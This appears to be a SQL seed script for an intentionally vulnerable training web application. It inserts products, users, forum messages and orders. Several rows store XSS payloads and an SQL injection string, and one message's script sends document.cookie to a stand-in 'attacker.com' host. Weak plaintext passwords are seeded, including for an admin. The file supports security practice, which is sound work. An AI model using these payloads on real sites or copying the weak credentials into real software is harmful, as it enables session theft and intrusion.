USE VulnerableApp;
GO

-- Add more vulnerable products for comprehensive testing
INSERT INTO Products (Name, Description, Price, Category, ImageUrl)
VALUES 
    ('XSS Demo', '<script>alert(document.cookie)</script>Vulnerable product', 49.99, 'Security', '/images/xss-product.jpg'),
    ('SQL Injection Kit', 'Test various payloads: '' OR ''1''=''1', 39.99, 'Security', '/images/sql-kit.jpg'),
    ('CSRF Demo', 'Demonstrates cross-site request forgery', 29.99, 'Security', '/images/csrf-demo.jpg'),
    ('Broken Auth Demo', 'Shows weak authentication mechanisms', 19.99, 'Security', '/images/auth-demo.jpg');

-- Add more users with various vulnerabilities
INSERT INTO Users (Username, Password, Email, FullName, IsAdmin)
VALUES 
    ('test_user', 'password', 'test@example.com', 'Test User', 0),
    ('dev_admin', 'dev123', 'dev@example.com', 'Developer Admin', 1),
    ('guest', 'guest', 'guest@example.com', 'Guest User', 0),
    ('security', 'security123!', 'security@example.com', 'Security Engineer', 0);

-- Add more XSS-vulnerable messages for the forum
INSERT INTO Messages (UserId, Title, Content, IsPublic)
VALUES
    (1, 'Help With XSS', 'I found this cool trick: <img src="x" onerror="alert(''XSS'')">', 1),
    (2, 'Admin Announcement', '<script>document.write(''<img src="https://attacker.com/steal?cookie=''+document.cookie+''">'');</script>', 1),
    (3, 'Security Tips', 'Always validate user input <iframe src="javascript:alert(``XSS``);"></iframe>', 1);

-- Add some orders for testing access control
INSERT INTO Orders (UserId, OrderDate, TotalAmount)
VALUES
    (1, GETDATE(), 49.99),
    (2, DATEADD(day, -1, GETDATE()), 99.98),
    (3, DATEADD(day, -2, GETDATE()), 29.99),
    (1, DATEADD(day, -5, GETDATE()), 149.97);